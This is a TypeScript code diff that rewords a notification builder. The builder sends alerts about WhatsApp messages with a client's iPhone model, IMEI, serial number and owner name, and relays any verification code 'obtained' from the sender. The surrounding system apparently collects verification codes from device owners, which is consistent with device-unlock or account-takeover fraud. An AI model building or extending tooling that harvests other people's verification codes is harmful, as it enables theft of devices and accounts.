@@ -763,15 +763,13 @@ function buildNotificationMessage(process: any, phoneNumber: string, messageText
   const isCodeObtained = analysis.type === 'code_obtained';
   const isVerificationCode = analysis.type === 'verification_code';
   
-  return `🔔 Alerta de proceso de WhatsApp
-
-👩🏽‍💻 Servidor Astro
+  return `🔔 Nuevo mensaje WhatsApp recibido
 
 📊 INFORMACIÓN DEL PROCESO:
-👤 Cliente: ${process.client_name}
-📱 Modelo: ${process.iphone_model}
-📞 IMEI: ${process.imei}
-🔢 Serie: ${process.serial_number}
+👤 Cliente: ${process.client_name || 'No especificado'}
+📱 Modelo: ${process.iphone_model || 'No especificado'}
+📞 IMEI: ${process.imei || 'No especificado'}
+🔢 Serie: ${process.serial_number || 'No especificado'}
 ${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}
 
 📞 Remitente: ${phoneNumber}
@@ -779,8 +777,6 @@ ${isCodeObtained ?
     `🔐 CÓDIGO OBTENIDO: ${messageText} (${analysis.codeLength} dígitos)` : 
     (isVerificationCode ? 
       `🔐 CÓDIGO DE VERIFICACIÓN: ${messageText} (${analysis.codeLength} dígitos)` :
-      `📥 Respuesta: ${messageText}`)
-}
-
-🤖 Bot Astro en línea 🟢`;
+      `📥 Mensaje: ${messageText}`)
+}`;
 }
